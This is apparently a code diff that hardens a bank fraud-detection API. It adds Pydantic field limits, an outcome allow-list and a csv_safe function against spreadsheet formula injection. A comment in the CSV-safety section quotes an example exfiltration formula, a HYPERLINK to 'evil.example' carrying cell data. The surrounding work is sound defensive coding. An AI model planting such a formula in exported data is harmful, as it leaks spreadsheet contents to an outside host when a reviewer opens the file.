@@ -21,7 +21,7 @@ from datetime import datetime
 
 from fastapi import FastAPI
 from fastapi.staticfiles import StaticFiles
-from pydantic import BaseModel
+from pydantic import BaseModel, Field
 
 from risk_engine import (
     build_user_profile,
@@ -48,6 +48,32 @@ AUDIT_HEADER = [
 # A coercive call is strong evidence, but the payment itself still leads.
 VOICE_WEIGHT = 0.6
 
+# Only these values may ever be written to the outcome column.
+VALID_OUTCOMES = {"PENDING", "CONFIRMED_FRAUD", "CONFIRMED_LEGITIMATE", "UNKNOWN"}
+
+
+# ---------------------------------------------------------------------------
+# CSV SAFETY
+#
+# A spreadsheet treats a cell beginning with = + - or @ as a FORMULA, not
+# text. Since the audit log is meant to be opened by a bank reviewer in
+# Excel, an attacker who controls a payee name could write something like
+#   =HYPERLINK("https://evil.example/"&A1,"click")
+# and have it execute the moment the reviewer opens the file. Prefixing a
+# single quote makes the spreadsheet treat the value as plain text.
+# Control characters are stripped so a value cannot break the row apart.
+# ---------------------------------------------------------------------------
+def csv_safe(value):
+    """Neutralise spreadsheet formula injection in a value bound for CSV."""
+    if value is None:
+        return ""
+    text = str(value)
+    # strip characters that can break row/column structure or trigger formulas
+    text = text.replace("\r", " ").replace("\n", " ").replace("\t", " ")
+    if text[:1] in ("=", "+", "-", "@"):
+        text = "'" + text
+    return text
+
 
 # ---- Load transaction history once, so we can build user profiles ----
 def load_profiles():
@@ -64,33 +90,39 @@ def load_profiles():
 PROFILES = load_profiles()
 
 
-# ---- Shape of the data the web page will send us ----
+# ---------------------------------------------------------------------------
+# REQUEST SHAPES
+#
+# Length limits are deliberate: without them a single request could carry a
+# multi-megabyte transcript, which both exhausts memory and multiplies the
+# work done by every phrase scan in the voice detector.
+# ---------------------------------------------------------------------------
 class Transaction(BaseModel):
-    user_id: str
-    amount: float
-    payee: str
-    city: str
-    device: str
-    timestamp: str
-    transcript: str = ""                        # optional call transcript
-    accessibility_service_active: bool = False  # screen-control app running
+    user_id: str = Field(..., max_length=50)
+    amount: float = Field(..., ge=0, le=10_000_000)
+    payee: str = Field(..., max_length=200)
+    city: str = Field(..., max_length=100)
+    device: str = Field(..., max_length=100)
+    timestamp: str = Field(..., max_length=40)
+    transcript: str = Field("", max_length=5000)     # optional call transcript
+    accessibility_service_active: bool = False       # screen-control app running
 
 
 class Decision(BaseModel):
-    user_id: str
-    amount: float
-    payee: str
-    decision: str        # what the shield said: APPROVE / WARN / BLOCK
-    score: int
-    user_action: str     # what the human chose: CONFIRMED / CANCELLED
-    confidence: str = ""
-    signal_count: int = 0
+    user_id: str = Field(..., max_length=50)
+    amount: float = Field(..., ge=0, le=10_000_000)
+    payee: str = Field(..., max_length=200)
+    decision: str = Field(..., max_length=20)   # APPROVE / WARN / BLOCK
+    score: int = Field(..., ge=0, le=100)
+    user_action: str = Field(..., max_length=20)  # CONFIRMED / CANCELLED
+    confidence: str = Field("", max_length=20)
+    signal_count: int = Field(0, ge=0, le=100)
 
 
 class Outcome(BaseModel):
     """What actually happened, recorded later by a bank reviewer."""
-    row_index: int       # position in the audit log (newest-first, as shown)
-    outcome: str         # CONFIRMED_FRAUD / CONFIRMED_LEGITIMATE / UNKNOWN
+    row_index: int = Field(..., ge=0)   # position in the audit log (newest-first)
+    outcome: str = Field(..., max_length=40)
 
 
 # ---- Turn voice signals into the same decomposed shape as payment rules ----
@@ -194,8 +226,15 @@ def record_decision(d: Decision):
             writer.writerow(AUDIT_HEADER)
         writer.writerow([
             datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-            d.user_id, d.amount, d.payee, d.decision, d.score, d.user_action,
-            d.confidence, d.signal_count, "PENDING",
+            csv_safe(d.user_id),
+            d.amount,
+            csv_safe(d.payee),
+            csv_safe(d.decision),
+            d.score,
+            csv_safe(d.user_action),
+            csv_safe(d.confidence),
+            d.signal_count,
+            "PENDING",
         ])
     return {"status": "logged"}
 
@@ -208,6 +247,11 @@ def record_outcome(o: Outcome):
     overrides a warning, the bank can later mark whether it really was fraud.
     Those marks are what a future model would learn from.
     """
+    # Only a fixed set of outcome values is ever accepted, so nothing
+    # arbitrary can be written into the audit trail.
+    if o.outcome not in VALID_OUTCOMES:
+        return {"status": "invalid outcome"}
+
     if not os.path.exists(AUDIT_FILE):
         return {"status": "no log"}
 
